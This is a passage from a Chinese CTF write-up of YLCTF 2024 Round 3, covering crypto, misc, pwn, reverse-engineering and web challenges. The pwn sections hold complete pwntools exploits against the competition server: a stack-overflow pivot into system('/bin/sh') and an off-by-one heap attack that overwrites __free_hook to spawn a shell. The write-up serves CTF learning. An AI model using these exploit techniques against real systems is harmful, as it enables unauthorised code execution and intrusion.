- b) * inverse(a, N) % N<br>                <span class="hljs-keyword">return</span> seed<br><br>            seed = lcg_seed(num1, num2, a, N)<br>            p.sendline(<span class="hljs-built_in">str</span>(seed))<br>            response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>            <span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># Challenge three 部分</span><br>data = p.recvuntil(<span class="hljs-string">&quot;Challenge three,10 Round&quot;</span>.encode()).decode()<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Challenge three,10 Round&quot;</span> <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;进入 Challenge three, 10 Round&quot;</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        data = p.recvuntil(<span class="hljs-string">&quot;seed =&quot;</span>.encode()).decode()<br><br>        N_match = re.search(<span class="hljs-string">r&#x27;N=(\d+)&#x27;</span>, data)<br>        num1_match = re.search(<span class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br>        num2_match = re.search(<span class="hljs-string">r&#x27;num2=(\d+)&#x27;</span>, data)<br>        num3_match = re.search(<span class="hljs-string">r&#x27;num3=(\d+)&#x27;</span>, data)<br><br>        <span class="hljs-keyword">if</span> N_match <span class="hljs-keyword">and</span> num1_match <span class="hljs-keyword">and</span> num2_match <span class="hljs-keyword">and</span> num3_match:<br>            N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>            num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br>            num2 = <span class="hljs-built_in">int</span>(num2_match.group(<span class="hljs-number">1</span>))<br>            num3 = <span class="hljs-built_in">int</span>(num3_match.group(<span class="hljs-number">1</span>))<br><br>            <span class="hljs-comment"># 使用 LCG 解密函数找到 seed</span><br>            seed, a, b = find_seed(N, num1, num2, num3)<br><br>            <span class="hljs-keyword">if</span> seed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                p.sendline(<span class="hljs-built_in">str</span>(seed))<br>                response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>                <span class="hljs-built_in">print</span>(response.decode())<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法找到种子&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h5 id="round-3-qwq"><a class="markdownIt-Anchor" href="#round-3-qwq"></a> [Round 3] QWQ</h5>
<p>明显的颜文字，转一下再base解密即可</p>
<p><img src="/../../images/ylctf/2024/qwq.png" srcset="/img/loading.gif" lazyload alt="qwq"></p>
<h4 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3"></a> Misc</h4>
<h5 id="round-3-blackdoor"><a class="markdownIt-Anchor" href="#round-3-blackdoor"></a> [Round 3] Blackdoor</h5>
<p>一个文件夹，用d盾扫一下发现危险文件，里面有MD5值，套一下得到flag</p>
<h4 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3"></a> Pwn</h4>
<h5 id="round-3-secret"><a class="markdownIt-Anchor" href="#round-3-secret"></a> [Round 3] Secret</h5>
<p>附件ida打开输入nc连接输入密文<code>SuperSecretPassword</code>得到flag</p>
<h5 id="round-3-ezstack3"><a class="markdownIt-Anchor" href="#round-3-ezstack3"></a> [Round 3] ezstack3</h5>
<p>先看mian和vuln,再观察system利用栈溢出漏洞首先发送填充数据以覆盖返回地址，然后接收 EBP 地址并计算其偏移。接着构造 payload，调用 <code>system</code> 函数执行 <code>/bin/sh</code>，最终获得交互式 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">32407</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome to YLCTF stack3&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span>)<br><br>ebp = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">16</span><br>p.recvuntil(<span class="hljs-string">b&#x27;pwn!&#x27;</span>)<br><br>p.send(<br>    p32(<span class="hljs-number">0x080490C0</span>) +    <span class="hljs-comment"># system</span><br>    p32(<span class="hljs-number">0</span>) +            <span class="hljs-comment"># argument for system</span><br>    p32(ebp - <span class="hljs-number">36</span>) +     <span class="hljs-comment"># return address</span><br>    <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> +<br>    <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">28</span> +<br>    p32(ebp - <span class="hljs-number">52</span>) +     <span class="hljs-comment"># old EBP</span><br>    p32(<span class="hljs-number">0x08049324</span>)     <span class="hljs-comment"># leave_ret</span><br>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/stack3.png" srcset="/img/loading.gif" lazyload alt="stack3"></p>
<h5 id="round-3-null"><a class="markdownIt-Anchor" href="#round-3-null"></a> [Round 3] null</h5>
<p>利用了 off-by-one 漏洞，通过 <code>edit</code> 函数实现堆块重叠，进而修改前一个堆块的 <code>fd</code> 指针以覆盖 <code>free_hook</code>。当再次释放该堆块时，程序会调用 <code>free_hook</code> 指向的地址，执行 <code>system</code> 函数，从而获取权限并启动一个 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">x</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_error</span>(<span class="hljs-params">x</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, is_remote=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-variable language_">self</span>.elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> is_remote:<br>            <span class="hljs-variable language_">self</span>.p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">39010</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>        <span class="hljs-variable language_">self</span>.libc_base = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.malloc_hook = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.free_hook = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.system = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.bin_sh = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr64</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> u64(<span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_libc_offsets</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.malloc_hook = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.free_hook = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.system = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.bin_sh = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-built_in">next</span>(<span class="hljs-variable language_">self</span>.libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br>    <span class="hljs-comment"># Heap operations</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, index, size</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Size &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(size))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">self, index</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self, index</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">self, index, content</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># Initial heap setup</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            <span class="hljs-variable language_">self</span>.add(i, <span class="hljs-number">0x90</span>)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-variable language_">self</span>.free(i)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>            <span class="hljs-variable language_">self</span>.add(i, <span class="hljs-number">0x90</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">7</span>, <span class="hljs-number">0x88</span>)<br><br>        <span class="hljs-variable language_">self</span>.show(<span class="hljs-number">7</span>)<br>        <span class="hljs-variable language_">self</span>.libc_base = <span class="hljs-variable language_">self</span>.get_addr64() - <span class="hljs-number">4111664</span><br>        print_info(<span class="hljs-string">f&quot;Libc base: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(self.libc_base)&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.get_libc_offsets()<br><br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">9</span>, <span class="hljs-number">0x18</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">10</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">11</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">13</span>, <span class="hljs-number">0x18</span>)<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0xe1</span>))<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">10</span>, <span class="hljs-number">0xd8</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">12</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">11</span>)<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-variable language_">self</span>.free_hook))<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">14</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">15</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">15</span>, p64(<span class="hljs-variable language_">self</span>.system))<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">9</span>)<br><br>        <span class="hljs-variable language_">self</span>.p.interactive()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    exp = Exploit(is_remote=<span class="hljs-literal">True</span>)<br>    exp.exploit()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/null.png" srcset="/img/loading.gif" lazyload alt="null"></p>
<h4 id="re-3"><a class="markdownIt-Anchor" href="#re-3"></a> Re</h4>
<h5 id="round-3-ezmaze一血"><a class="markdownIt-Anchor" href="#round-3-ezmaze一血"></a> [Round 3] ezmaze(一血)</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">visualize_maze</span>(<span class="hljs-params">maze_str, width=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Visualize the maze in a grid format.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join(maze_str[i:i + width] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(maze_str), width))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_move</span>(<span class="hljs-params">maze, pos</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Check if the current position is valid.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> &lt;= pos &lt; <span class="hljs-built_in">len</span>(maze) <span class="hljs-keyword">and</span> maze[pos] <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_maze</span>():<br>    maze = <span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span><br>    start_pos = <span class="hljs-number">5</span><br>    moves = &#123;<span class="hljs-string">&#x27;w&#x27;</span>: -<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;a&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><br>    queue = deque([(start_pos, <span class="hljs-string">&quot;&quot;</span>)])<br>    visited = &#123;start_pos&#125;<br><br>    <span class="hljs-keyword">while</span> queue:<br>        pos, path = queue.popleft()<br><br>        <span class="hljs-keyword">if</span> maze[pos] == <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br><br>        <span class="hljs-keyword">for</span> move_char, move_val <span class="hljs-keyword">in</span> moves.items():<br>            new_pos = pos<br>            <span class="hljs-keyword">while</span> is_valid_move(maze, new_pos + move_val):<br>                new_pos += move_val<br>                <span class="hljs-keyword">if</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                    visited.add(new_pos)<br>                    queue.append((new_pos, path + move_char))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_solution</span>(<span class="hljs-params">solution</span>):<br>    maze = <span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span><br>    pos = <span class="hljs-number">5</span><br>    move_map = &#123;<span class="hljs-string">&#x27;w&#x27;</span>: -<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;a&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><br>    <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> solution:<br>        move = move_map[action]<br>        <span class="hljs-keyword">while</span> is_valid_move(maze, pos + move):<br>            pos += move<br><br>    <span class="hljs-keyword">return</span> maze[pos] == <span class="hljs-string">&#x27;F&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    solution = solve_maze()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found solution path: <span class="hljs-subst">&#123;solution&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> verify_solution(solution):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution verified: Valid!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution verification failed!&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    flag = <span class="hljs-string">&quot;YLCTF&#123;&quot;</span> + hashlib.md5(solution.encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nMaze visualization (10x10 grid):&quot;</span>)<br>    <span class="hljs-built_in">print</span>(visualize_maze(<span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nFinal flag:&quot;</span>, flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<h5 id="round-3-case"><a class="markdownIt-Anchor" href="#round-3-case"></a> [Round 3] CASE</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 加载 libc</span><br>libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># 连接到靶机</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">30037</span>)<br><br><span class="hljs-comment"># 用于保存加密值</span><br>enc = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    response = p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)<br>    enc.append(response.strip().decode().rstrip(<span class="hljs-string">&#x27;,&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted values:&quot;</span>, enc)<br><br>enc_values = [<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> enc]<br><br><span class="hljs-comment"># 用于保存解密的结果</span><br>decrypted = []<br><br><br>seed = <span class="hljs-built_in">int</span>(time.time())<br>libc.srand(seed)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc_values)):<br>    v5 = libc.rand()<br>    original_char = (enc_values[i] ^ (v5 % <span class="hljs-number">255</span>))<br><br>    <span class="hljs-comment"># 反向映射字符</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">65</span> &lt;= original_char &lt;= <span class="hljs-number">90</span>:  <span class="hljs-comment"># A-Z</span><br>        decrypted_char = <span class="hljs-built_in">chr</span>((original_char + <span class="hljs-number">52</span> - <span class="hljs-number">65</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">97</span> &lt;= original_char &lt;= <span class="hljs-number">122</span>:  <span class="hljs-comment"># a-z</span><br>        decrypted_char = <span class="hljs-built_in">chr</span>((original_char + <span class="hljs-number">84</span> - <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)<br>    <span class="hljs-keyword">else</span>:<br>        decrypted_char = <span class="hljs-built_in">chr</span>(original_char)<br><br>    decrypted.append(decrypted_char)<br><br><span class="hljs-comment"># 输出解密结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted value:&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted))<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure>
<p>不知道具体的原理，要得到flag的话外面需要rot13内部需要rot7才能得到正确的flag，不太明白re，里面是根据uuid的特性得到的</p>
<p><img src="/../../images/ylctf/2024/case.png" srcset="/img/loading.gif" lazyload alt="case"></p>
<h4 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> Web</h4>
<h5 id="round-3-404"><a class="markdownIt-Anchor" href="#round-3-404"></a> [Round 3] 404</h5>
<p><code>/script.js</code>有提示，然后</p>
<p><img src="/../../images/ylctf/2024/404.png" srcset="/img/loading.gif" lazyload alt="404"></p>
